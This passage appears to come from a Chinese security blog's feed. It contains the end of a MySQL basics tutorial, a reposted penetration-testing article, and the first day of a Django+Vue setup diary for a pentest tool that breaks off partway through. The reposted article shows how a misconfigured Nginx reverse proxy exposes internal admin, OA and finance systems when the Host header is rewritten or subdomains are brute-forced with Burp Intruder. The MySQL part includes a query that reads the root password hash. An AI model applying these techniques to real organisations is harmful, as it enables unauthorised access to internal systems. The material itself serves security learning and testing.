<li>查看所有数据库、所在文件夹</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;			#查看所有数据库</span><br><span class="line">use mysql;				#进入数据库</span><br><span class="line">select database();		#查看当前所在位置</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>mysql三种注释符</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line">--[我是空格]fdaf</span><br><span class="line">/*dfaad*/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#单行注释用</span><br><span class="line">-- 单行使用--的话后面需要跟一个空格</span><br><span class="line">/**/ 多行用</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>增删数据库</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database abc;</span><br><span class="line">drop database abc;</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>改数据库值</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter database abc; </span><br></pre></td></tr></table></figure>

<ol start="8">
<li>查看数据表和表资源信息</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show tables;	#查看数据列表信息</span><br><span class="line">desc user;		#查看数据表内容</span><br><span class="line">show status;	#显示一些系统特定资源的信息，例如，正在运行的线程数量</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>筛查数据表用户密码</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select password from user where user=&#x27;root&#x27;;</span><br></pre></td></tr></table></figure>





















]]></content>
      <categories>
        <category>基础教程</category>
      </categories>
      <tags>
        <tag>Sql</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx配置不当导致内网资产暴漏</title>
    <url>/posts/1684ca85.html</url>
    <content><![CDATA[<blockquote>
<p>编者荐语: 利用 Nginx 配置不当，来探测内网子域名，这是一个没有关注过的探测方式，或许能在你没有头绪的时候能带来一点突破。 </p>
<p>转载自：<a href="https://www.yuque.com/broken5/blog/qzen0b">https://www.yuque.com/broken5/blog/qzen0b</a></p>
</blockquote>
<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>有一些企业通常会在外网部署一些Nginx服务器，然后在Nginx中配置域名绑定。用户访问对应的域名，Nginx通过反向代理将对应的内网资源反馈给互联网上的用户，这样企业可以把服务器部署在自己的内网中，又可以让用户访问到一举两得。但是如果配置不当的话，一些不应该让用户访问到的资源，用户通过特殊的手段也可以访问到。</p>
<p>注：IP如有雷同，纯属巧合</p>
<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>现有一个A公司，他的主域名为ceshi.com</p>
<p>公司主要业务系统如下表所示</p>
<table>
<thead>
<tr>
<th>系统名称</th>
<th>IP</th>
</tr>
</thead>
<tbody><tr>
<td>门户网站</td>
<td>10.1.20.1</td>
</tr>
<tr>
<td>商城</td>
<td>10.1.20.2</td>
</tr>
<tr>
<td>论坛</td>
<td>10.1.20.3</td>
</tr>
<tr>
<td>商城管理系统</td>
<td>10.1.20.102</td>
</tr>
<tr>
<td>论坛管理系统</td>
<td>10.1.20.103</td>
</tr>
<tr>
<td>OA系统</td>
<td>10.1.20.201</td>
</tr>
<tr>
<td>财务系统</td>
<td>10.1.20.202</td>
</tr>
<tr>
<td>nginx服务器</td>
<td>10.1.20.254</td>
</tr>
</tbody></table>
<p>门户网站、商城、论坛相关业务系统需要发布到外网供用户访问，所以运维人员就给nginx服务器添加了一个公网IP（203.100.103.88），给业务系统绑定了子域名</p>
<table>
<thead>
<tr>
<th>系统名称</th>
<th>子域名</th>
<th>解析地址</th>
</tr>
</thead>
<tbody><tr>
<td>门户网站</td>
<td><a href="http://www.ceshi.com/">www.ceshi.com</a></td>
<td>203.100.103.88</td>
</tr>
<tr>
<td>商城</td>
<td>shop.ceshi.com</td>
<td>203.100.103.88</td>
</tr>
<tr>
<td>论坛</td>
<td>bbs.ceshi.com</td>
<td>203.100.103.88</td>
</tr>
</tbody></table>
<p>通过在nginx服务器上配置反向代理，用户只要在浏览器上输入对应的域名，nginx就会匹配用户请求头中的HOST字段将请求转发到内网对应的服务器上面，如下图所示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E5%86%85%E7%BD%91%E8%B5%84%E4%BA%A7%E6%9A%B4%E6%BC%8F/1600456066219-4b3f25da-6b81-4108-9968-21ddb0f7ec93.png" alt="img"></p>
<p>为了方便企业员工办公，运维人员同样给管理系统绑定了域名。考虑到管理系统暴露在外网会遭到攻击，所以就把解析记录设置为10.1.20.254（nginx服务器）</p>
<table>
<thead>
<tr>
<th>系统名称</th>
<th>子域名</th>
<th>解析地址</th>
</tr>
</thead>
<tbody><tr>
<td>商城管理系统</td>
<td>shopadmin.ceshi.com</td>
<td>10.1.20.254</td>
</tr>
<tr>
<td>论坛管理系统</td>
<td>bbsadmin.ceshi.com</td>
<td>10.1.20.254</td>
</tr>
<tr>
<td>OA系统</td>
<td>oa.ceshi.com</td>
<td>10.1.20.254</td>
</tr>
<tr>
<td>财务系统</td>
<td>cw.ceshi.com</td>
<td>10.1.20.254</td>
</tr>
</tbody></table>
<p>同样在nginx服务器上配置反向代理，如下图所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E5%86%85%E7%BD%91%E8%B5%84%E4%BA%A7%E6%9A%B4%E6%BC%8F/1600456416147-e6bdbd63-94c5-466a-a35b-48f3f3d289fe.png" alt="img"></p>
<p>运维人员无意中犯了一个错误，他把内网的管理系统和业务系统都用同一台nginx服务器进行反向代理，且这台服务器外网用户可以直接访问到。攻击者只需要在本地修改Host记录为<code>203.100.103.88 oa.ceshi.com</code>，就可以成功访问内部的管理系统，如下图所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E5%86%85%E7%BD%91%E8%B5%84%E4%BA%A7%E6%9A%B4%E6%BC%8F/1600456846443-03e32f94-1de8-4dfd-ac5e-9b88a997135b.png" alt="img"></p>
<h2 id="0x03-案例"><a href="#0x03-案例" class="headerlink" title="0x03 案例"></a>0x03 案例</h2><p>子域名收集后往往会看见一些域名对应的IP是内网IP，是不能访问到的，以前我一般都会忽略这些子域名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E5%86%85%E7%BD%91%E8%B5%84%E4%BA%A7%E6%9A%B4%E6%BC%8F/1597119494507-3c306233-0094-4d9d-a981-691779022b48.png" alt="img"></p>
<p>子域名收集过后，对IP进行统计</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E5%86%85%E7%BD%91%E8%B5%84%E4%BA%A7%E6%9A%B4%E6%BC%8F/1597119657838-420f99b9-a9c8-423c-a178-0fd201d29b64.png" alt="img"></p>
<p>发现多个Nginx节点服务器，这些服务器和前面一样，就是让用户访问企业部署的nginx反向代理服务器</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E5%86%85%E7%BD%91%E8%B5%84%E4%BA%A7%E6%9A%B4%E6%BC%8F/1597119695195-acd1229a-90b4-4913-8a9e-80a3ebba31fb.png" alt="img"></p>
<p>因为有些子域名DNS直接给解析成了内网IP，也就是企业的内网资源</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E5%86%85%E7%BD%91%E8%B5%84%E4%BA%A7%E6%9A%B4%E6%BC%8F/1597119892490-bed141f1-a23b-4f4a-a383-b8b864b1057f.png" alt="img"></p>
<p>利用Burpsuite修改Host头，成功访问了skywalking，说明nginx服务器上配置了该域名的反向代理</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E5%86%85%E7%BD%91%E8%B5%84%E4%BA%A7%E6%9A%B4%E6%BC%8F/1597120030642-dc1c0033-b251-45d7-a672-030da71c6a5b.png" alt="img"></p>
<p>通过Intruder修改HOST头爆破所有解析记录为内网IP的子域名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E5%86%85%E7%BD%91%E8%B5%84%E4%BA%A7%E6%9A%B4%E6%BC%8F/1597120083395-6dcc863f-85a8-4d48-a491-83cb744e7db7.png" alt="img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E5%86%85%E7%BD%91%E8%B5%84%E4%BA%A7%E6%9A%B4%E6%BC%8F/1600457267836-1dd2325f-c6e9-4be9-8c1f-4495a54d4fb1.png" alt="img"></p>
<p>注意不要勾选编码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E5%86%85%E7%BD%91%E8%B5%84%E4%BA%A7%E6%9A%B4%E6%BC%8F/1597120145291-e8cb7b95-a4e1-4773-9953-779320834fbd.png" alt="img"></p>
<p>通过观察返回包的长度来判断是否爆破到内网资产</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Nginx%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E5%86%85%E7%BD%91%E8%B5%84%E4%BA%A7%E6%9A%B4%E6%BC%8F/1597120211320-6a4c9182-c452-4f77-bf8f-e125d75f74c0.png" alt="img"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>Django+Vue+ElementUi 环境搭建 day1</title>
    <url>/posts/479446a4.html</url>
    <content><![CDATA[<h1 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h1><h2 id="📌前言"><a href="#📌前言" class="headerlink" title="📌前言"></a>📌前言</h2><p>毕业设计的设想是做一个渗透测试系统，包含信息收集模块和漏洞扫描模块和插件模块，这都是老生常谈，有很多的类似系统，我的最终设想是做成一个 Web 版的 Goby。</p>
<p>这个系统将彻底杀死 web 渗透，他会将繁琐的手工测试取代，测试的内容涵盖所有可能存在的漏洞点，未来的测试人员只需要输入目标即可自动化完成渗透测试。</p>
<p>我觉得要将安全从业人员从繁琐的的手工测试中解脱出来是十分伟大而意义深远的事情。</p>
<p>着眼未来，将人力资源浪费在重复枯燥的渗透测试中是十分可惜的。</p>
<p>所以我决定做这件事，道阻且长，但我不会放弃。</p>
<p>我想使用 Django + Vue 开发成一个前后端分离的系统，顺带学习一下 Vue。</p>
<p>重复造轮子不可取，但我只是想把毕业设计做了的同时学习一下安全工具的开发，对于我来说，这是一件艰巨且充满挑战的任务。</p>
<p>每次完成任务都记录一下，方便下次开发的顺利进行。</p>
<h2 id="🚥环境搭建"><a href="#🚥环境搭建" class="headerlink" title="🚥环境搭建"></a>🚥环境搭建</h2><p>开发工具Vscode、Python&#x3D;3.7.0、Django&#x3D;3.2.13、nodejs&#x3D;v14.18.1、npm&#x3D;6.14.15、mysql（后期添加）</p>
<p><strong>开发工具：VsCode</strong></p>
<p>插件安装：中文汉化、Python、</p>
<p>下载链接：<a href="https://code.visualstudio.com/Download">https://code.visualstudio.com/Download</a></p>
<p>安装教程：<a href="https://www.runoob.com/w3cnote/vscode-tutorial.html">https://www.runoob.com/w3cnote/vscode-tutorial.html</a></p>
<p><strong>开发语言：Python</strong></p>
<p>创建虚拟环境：推荐 virtualenv</p>
<p>pip 安装 Django</p>
<p>下载链接：<a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a></p>
<p>安装教程: <a href="https://www.runoob.com/python3/python3-install.html">https://www.runoob.com/python3/python3-install.html</a></p>
<p><strong>框架：Django</strong></p>
<p>下载链接：<a href="https://www.djangoproject.com/download/">https://www.djangoproject.com/download/</a></p>
<p>安装教程：<a href="https://www.runoob.com/django/django-install.html">https://www.runoob.com/django/django-install.html</a></p>
<p><strong>Node.js</strong></p>
<p>下载链接：<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a></p>
<p>安装教程：<a href="https://www.runoob.com/nodejs/nodejs-install-setup.html">https://www.runoob.com/nodejs/nodejs-install-setup.html</a></p>
<p><strong>数据库：mysql</strong></p>
<p>下载链接：<a href="https://dev.mysql.com/downloads/mysql/">https://dev.mysql.com/downloads/mysql/</a></p>
<p>安装教程：<a href="https://www.runoob.com/mysql/mysql-tutorial.html">https://www.runoob.com/mysql/mysql-tutorial.html</a></p>
<h2 id="🔧一、Django"><a href="#🔧一、Django" class="headerlink" title="🔧一、Django"></a>🔧一、Django</h2><h3 id="1-创建项目"><a href="#1-创建项目" class="headerlink" title="1.创建项目"></a>1.创建项目</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">django-admin startproject PentestWeb</span><br></pre></td></tr></table></figure>

<h3 id="2-数据库配置"><a href="#2-数据库配置" class="headerlink" title="2.数据库配置"></a>2.数据库配置</h3><p>安装完MySQL 建好数据库</p>
<p>cmd窗口登录MySQL：<code>mysql -uroot -p </code></p>
<p>安装python的pymysql包：<code>pip install pymysql</code></p>
<p>创建数据库：<code>create DATABASE 数据库名称 DEFAULT CHARSET utf8;</code></p>
<p><strong>配置数据库：在setting.py 查找 DATABASES</strong></p>
<p>修改数据库连接信息:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> DATABASES = &#123;</span><br><span class="line"></span><br><span class="line"> &#x27;default&#x27;: &#123;</span><br><span class="line"></span><br><span class="line">     # &#x27;ENGINE&#x27;: &#x27;django.db.backends.sqlite3&#x27;,</span><br><span class="line"></span><br><span class="line">     # &#x27;NAME&#x27;: BASE_DIR / &#x27;db.sqlite3&#x27;,</span><br><span class="line"></span><br><span class="line">     # 自定义数据库</span><br><span class="line"></span><br><span class="line">​     &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;,  # 数据库引擎</span><br><span class="line"></span><br><span class="line">​     &#x27;NAME&#x27;: &#x27;Django_ElementUI&#x27;,  # 数据库名称</span><br><span class="line"></span><br><span class="line">​     &#x27;HOST&#x27;: &#x27;127.0.0.1&#x27;,  # 数据库地址，本机 ip 地址 127.0.0.1</span><br><span class="line"></span><br><span class="line">​     &#x27;PORT&#x27;: 3306,  # 端口</span><br><span class="line"></span><br><span class="line">​     &#x27;USER&#x27;: &#x27;root&#x27;,  # 数据库用户名</span><br><span class="line"></span><br><span class="line">​     &#x27;PASSWORD&#x27;: &#x27;&#x27;,  # 数据库密码</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><strong>引入模块：在 <strong>init</strong>.py文件里增加：</strong></p>
<blockquote>
<p>import pymysql</p>
</blockquote>
<blockquote>
<p>pymysql.install_as_MySQLdb()</p>
</blockquote>
<h3 id="3-创建模型并且设计数据库表"><a href="#3-创建模型并且设计数据库表" class="headerlink" title="3.创建模型并且设计数据库表"></a>3.创建模型并且设计数据库表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py startapp InfoScan</span><br></pre></td></tr></table></figure>

<p>创建好 app 之后，进入 models.py 文件，创建数据库类：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.db import models</span><br><span class="line">class Student(models.Model):</span><br><span class="line"> </span><br><span class="line">    student_name = models.CharField(max_length=64)</span><br><span class="line"> </span><br><span class="line">    student_sex = models.CharField(max_length=3)</span><br><span class="line"> </span><br><span class="line">    create_time = models.DateTimeField(auto_now_add=True)</span><br><span class="line"> </span><br><span class="line">    def __str__(self):</span><br><span class="line"> </span><br><span class="line">        return self.student_name,self.id</span><br></pre></td></tr></table></figure>

<h3 id="4-注册app"><a href="#4-注册app" class="headerlink" title="4.注册app"></a>4.注册app</h3><p>在INSTALLED_APPS中 添加’InfoScan’:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    &#x27;InfoScan&#x27;,</span><br><span class="line">    &#x27;django.contrib.admin&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth&#x27;,</span><br><span class="line">    &#x27;django.contrib.contenttypes&#x27;,</span><br><span class="line">    &#x27;django.contrib.sessions&#x27;,</span><br><span class="line">    &#x27;django.contrib.messages&#x27;,</span><br><span class="line">    &#x27;django.contrib.staticfiles&#x27;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="5-生成数据库迁移文件"><a href="#5-生成数据库迁移文件" class="headerlink" title="5.生成数据库迁移文件"></a>5.生成数据库迁移文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py migrate</span><br><span class="line">python manage.py makemigrations</span><br></pre></td></tr></table></figure>

<h3 id="6-创建视图处理函数"><a href="#6-创建视图处理函数" class="headerlink" title="6.创建视图处理函数"></a>6.创建视图处理函数</h3><p>作为接口 给前端调用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> unicode_literals</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> serializers</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.views.decorators.http <span class="keyword">import</span> require_http_methods</span><br><span class="line"><span class="keyword">from</span> myApp.models <span class="keyword">import</span> Student</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建view</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#add_student 接受一个get请求 网数据里添加一条student 数据</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@require_http_methods(<span class="params">[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_student</span>(<span class="params">request</span>):</span><br><span class="line">    response = &#123;&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"> </span><br><span class="line">        student = Student(student_name=request.GET.get(<span class="string">&#x27;student_name&#x27;</span>))</span><br><span class="line"> </span><br><span class="line">        student.save()</span><br><span class="line"> </span><br><span class="line">        response[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;success&quot;</span></span><br><span class="line"> </span><br><span class="line">        response[<span class="string">&#x27;error_num&#x27;</span>]=<span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"> </span><br><span class="line">            response[<span class="string">&#x27;msg&#x27;</span>] = <span class="built_in">str</span>(e)</span><br><span class="line"> </span><br><span class="line">            response[<span class="string">&#x27;error_num&#x27;</span>] = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> JsonResponse(response)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># show_students返回所有的学生列表（通过JsonResponse返回能被前端识别的json格式数据）</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@require_http_methods(<span class="params">[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_students</span>(<span class="params">request</span>):</span><br><span class="line">    response = &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        students = Student.objects.<span class="built_in">filter</span>()</span><br><span class="line">        response[<span class="string">&#x27;list&#x27;</span>] = json.loads(serializers.serialize(<span class="string">&quot;json&quot;</span>, students))</span><br><span class="line">        response[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;success&#x27;</span></span><br><span class="line">        response[<span class="string">&#x27;error_num&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        response[<span class="string">&#x27;msg&#x27;</span>] = <span class="built_in">str</span>(e)</span><br><span class="line">        response[<span class="string">&#x27;error_num&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> JsonResponse(response)</span><br></pre></td></tr></table></figure>

<h3 id="7-配置路由"><a href="#7-配置路由" class="headerlink" title="7.配置路由"></a>7.配置路由</h3><p>InfoScan app 下面新增 urls.py 文件</p>
<p>创建分支路由，把新增的两个视图函数放进来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.conf.urls import url</span><br><span class="line">from . import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(&#x27;add_student/&#x27;,views.add_student),</span><br><span class="line">    url(&#x27;show_students/&#x27;,views.show_students),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>将分支路由加到项目文件夹下的主路由中urls.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.contrib import admin</span><br><span class="line">from django.urls import path</span><br><span class="line">from django.views.generic import TemplateView</span><br><span class="line">from django.conf.urls import include</span><br><span class="line">from InfoScan import urls</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(&#x27;admin/&#x27;, admin.site.urls),</span><br><span class="line">    path(&#x27;api/&#x27;, include(urls)),</span><br><span class="line">    path(&#x27;&#x27;, TemplateView.as_view(template_name=&#x27;index.html&#x27;)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<h2 id="🔧二、Vue"><a href="#🔧二、Vue" class="headerlink" title="🔧二、Vue"></a>🔧二、Vue</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/PentestWeb%E5%BC%80%E5%8F%91(%E4%B8%80)/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVmluY2VudHN4aA==,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p>
<h3 id="1-安装脚手架"><a href="#1-安装脚手架" class="headerlink" title="1.安装脚手架"></a>1.安装脚手架</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g vue-cli</span><br></pre></td></tr></table></figure>

<h3 id="2-新建前端工程项目"><a href="#2-新建前端工程项目" class="headerlink" title="2.新建前端工程项目"></a>2.新建前端工程项目</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vue-init webpack ptvue</span><br></pre></td></tr></table></figure>

<p><a href="https://www.jianshu.com/p/9f1bb706311a">https://www.jianshu.com/p/9f1bb706311a</a></p>
<h3 id="3-安装依赖包"><a href="#3-安装依赖包" class="headerlink" title="3.安装依赖包"></a>3.安装依赖包</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ptvue</span><br><span class="line">npm install</span><br><span class="line"># 尝试一下是否可以运行</span><br><span class="line">npm dev	</span><br></pre></td></tr></table></figure>

<h3 id="4-安装ElementUI"><a href="#4-安装ElementUI" class="headerlink" title="4.安装ElementUI"></a>4.安装ElementUI</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ptvue</span><br><span class="line">npm i element-ui -S</span><br><span class="line"># 如果提示缺失依赖，安装就好了</span><br><span class="line">npm install -g core-js@3.1.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--save 安装依赖到 mode_modules 目录下,写入dependencies节点, npm install 时下载该依赖,一般安装生成环境所用依赖, 如 vue, element-ui, echarts…</span><br><span class="line">-g 全局安装,不在 mode_modules 目录下,不写入节点, npm install 时不下载该依赖.</span><br></pre></td></tr></table></figure>

<h3 id="5-创建vue页面"><a href="#5-创建vue页面" class="headerlink" title="5.创建vue页面"></a>5.创建vue页面</h3><p>在src&#x2F;component下，新建组件Student.vue</p>
<p>调用之前在Django项目里的api实现相应的功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line"> </span><br><span class="line">  &lt;div class=&quot;home&quot;&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;el-row display=&quot;margin-top:10px&quot;&gt;</span><br><span class="line"> </span><br><span class="line">        &lt;el-input v-model=&quot;input&quot; placeholder=&quot;请输入学生姓名&quot; style=&quot;display:inline-table; width: 30%; float:left&quot;&gt;&lt;/el-input&gt;</span><br><span class="line"> </span><br><span class="line">        &lt;el-button type=&quot;primary&quot; @click=&quot;addStudent()&quot; style=&quot;float:left; margin: 2px;&quot;&gt;新增&lt;/el-button&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;/el-row&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;el-row&gt;</span><br><span class="line"> </span><br><span class="line">        &lt;el-table :data=&quot;studentList&quot; style=&quot;width: 100%&quot; border&gt;</span><br><span class="line"> </span><br><span class="line">          &lt;el-table-column prop=&quot;id&quot; label=&quot;编号&quot; min-width=&quot;100&quot;&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;template slot-scope=&quot;scope&quot;&gt; &#123;&#123; scope.row.pk &#125;&#125; &lt;/template&gt;</span><br><span class="line"> </span><br><span class="line">          &lt;/el-table-column&gt;</span><br><span class="line"> </span><br><span class="line">          &lt;el-table-column prop=&quot;student_name&quot; label=&quot;姓名&quot; min-width=&quot;100&quot;&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;template slot-scope=&quot;scope&quot;&gt; &#123;&#123; scope.row.fields.student_name &#125;&#125; &lt;/template&gt;</span><br><span class="line"> </span><br><span class="line">          &lt;/el-table-column&gt;</span><br><span class="line"> </span><br><span class="line">          &lt;el-table-column prop=&quot;student_sex&quot; label=&quot;性别&quot; min-width=&quot;100&quot;&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;template slot-scope=&quot;scope&quot;&gt; &#123;&#123; scope.row.fields.student_sex &#125;&#125; &lt;/template&gt;</span><br><span class="line"> </span><br><span class="line">          &lt;/el-table-column&gt;</span><br><span class="line"> </span><br><span class="line">          &lt;el-table-column prop=&quot;add_time&quot; label=&quot;添加时间&quot; min-width=&quot;100&quot;&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;template slot-scope=&quot;scope&quot;&gt; &#123;&#123; scope.row.fields.create_time &#125;&#125; &lt;/template&gt;</span><br><span class="line"> </span><br><span class="line">          &lt;/el-table-column&gt;</span><br><span class="line"> </span><br><span class="line">        &lt;/el-table&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;/el-row&gt;</span><br><span class="line"> </span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/template&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">export default &#123;</span><br><span class="line"> </span><br><span class="line">  name: &#x27;Student&#x27;,</span><br><span class="line"> </span><br><span class="line">  data () &#123;</span><br><span class="line"> </span><br><span class="line">    return &#123;</span><br><span class="line"> </span><br><span class="line">      input: &#x27;&#x27;,</span><br><span class="line"> </span><br><span class="line">      studentList: []</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  &#125;,</span><br><span class="line"> </span><br><span class="line">  mounted: function () &#123;</span><br><span class="line"> </span><br><span class="line">    this.showStudents()</span><br><span class="line"> </span><br><span class="line">  &#125;,</span><br><span class="line"> </span><br><span class="line">  methods: &#123;</span><br><span class="line"> </span><br><span class="line">    addStudent () &#123;</span><br><span class="line"> </span><br><span class="line">      